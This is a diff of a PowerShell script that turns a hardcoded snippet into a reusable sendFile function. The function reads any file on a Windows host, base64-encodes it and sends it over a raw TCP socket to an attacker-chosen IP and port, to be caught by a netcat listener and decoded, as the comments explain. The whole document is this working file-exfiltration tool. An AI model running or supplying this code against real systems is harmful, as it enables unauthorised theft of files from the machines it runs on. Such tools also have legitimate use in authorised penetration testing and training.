@@ -1,14 +1,33 @@
-# Send a base64 encoded file to a listening NetCat instance
-# Get the original file by running "base64 -d" on the encoded data on a Linux box.
-# 
-# Change file path in the first line
-# Change IP and port in 2nd line
+#the output received on the netcat listener will be Base64 encoded. Decode via "cat file.b64 | base64 -d > file.exe" 
+#Execute this code, and then you can run "sendFile -ip 192.168.0.127 -port 3333 -filepath C:\windows\system32\cmd.exe"
 
-$test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\windows\system32\windowspowershell\v1.0\modules\smbshare\disableunusedsmb1.ps1"));
-$Socket = New-Object System.Net.Sockets.TCPClient('10.10.13.37',1337);
-$Stream = $Socket.GetStream();
-$Writer = New-Object System.IO.StreamWriter($Stream);
-$Writer.WriteLine($test);
-$Writer.Flush();
-$Stream.Close();
-$Socket.Close();
+Function sendFile {
+  Param (
+    [Parameter(Mandatory=$true)]
+    [ValidateNotNullOrEmpty()]
+    [string]
+    $ip
+    ,
+    [Parameter(Mandatory=$true)]
+    [ValidateNotNullOrEmpty()]
+    [int]
+    $port
+     ,
+    [Parameter(Mandatory=$true)]
+    [ValidateNotNullOrEmpty()]
+    [string]
+    $filepath  
+  )
+  
+  
+  $file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($filepath));
+  $Socket = New-Object System.Net.Sockets.TCPClient($ip, $port);
+  $Stream = $Socket.GetStream();
+  $Writer = New-Object System.IO.StreamWriter($Stream);
+  $Writer.WriteLine($file);
+  $Writer.Flush();
+  $Stream.Close();
+  $Socket.Close();
+
+
+}
